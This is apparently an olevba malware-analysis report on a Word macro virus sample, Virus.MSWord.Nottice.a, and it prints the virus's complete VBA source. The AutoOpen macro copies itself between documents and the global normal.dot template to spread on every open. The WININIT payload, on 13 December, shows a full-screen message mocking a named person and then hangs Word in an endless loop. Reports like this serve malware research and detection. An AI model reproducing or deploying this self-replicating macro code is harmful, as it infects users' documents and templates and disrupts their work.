olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nottice.a-67d165805aad2b28b00f20fd7b3aba86bbd24253
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nottice.a-67d165805aad2b28b00f20fd7b3aba86bbd24253 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Nottice.a-67d165805aad2b28b00f20fd7b3aba86bbd24253 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim J$
On Error GoTo -1: On Error GoTo Finish
WordBasic.DisableAutoMacros 0
J$ = LCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
If J$ = "normal.dot" Then
    If VI = 1 Then
        GoTo Finish
    Else
        InfectDOC
    End If
Else
    If VI2 = 1 Then
        GoTo Finish
    Else
        InfectGlobal
    End If
End If
Finish:
WordBasic.Call "WININIT"
End Sub

Private Function VI()
Dim i
VI = 0
If WordBasic.CountMacros(1) > 0 Then
    For i = 1 To WordBasic.CountMacros(1)
                If WordBasic.[MacroName$](i, 1) = "WININIT" Then
                             VI = 1
        End If
    Next i
End If
End Function

Private Function VI2()
Dim i
VI2 = 0
If WordBasic.CountMacros(0) > 0 Then
    For i = 1 To WordBasic.CountMacros(0)
                If WordBasic.[MacroName$](i, 0) = "WININIT" Then
                             VI2 = 1
        End If
    Next i
End If
End Function

Private Sub InfectDOC()
WordBasic.FileSaveAs Format:=1
WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoOpen"
WordBasic.MacroCopy "Global:WININIT", WordBasic.[FileName$]() + ":WININIT"
WordBasic.FileSaveAll 1, 1
End Sub

Private Sub InfectGlobal()
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoClose"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":WININIT", "Global:WININIT"
WordBasic.FileSaveAll 1, 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO WININIT.bas 
in file: Virus.MSWord.Nottice.a-67d165805aad2b28b00f20fd7b3aba86bbd24253 - OLE stream: 'Macros/VBA/WININIT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
If WordBasic.Day(WordBasic.Now()) = 13 And WordBasic.Month(WordBasic.Now()) = 12 Then
    WordBasic.FileNew
    WordBasic.ToggleFull
    WordBasic.DocMaximize
    WordBasic.Font "Imprint MT Shadow"
    WordBasic.FontSize 60
    WordBasic.Bold
    WordBasic.Insert "IMPORTAT NOTTICE!"
    WordBasic.StartOfLine
    WordBasic.CharRight 1, 1
    WordBasic.FormatFont Points:="48", Color:=6
    WordBasic.EndOfLine
    WordBasic.InsertPara
    WordBasic.InsertPara
    WordBasic.FontSize 48
    WordBasic.Insert "HANSSI A. A. IS MARRIED WITH A LOSSER."
HangOn:
GoTo HangOn
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

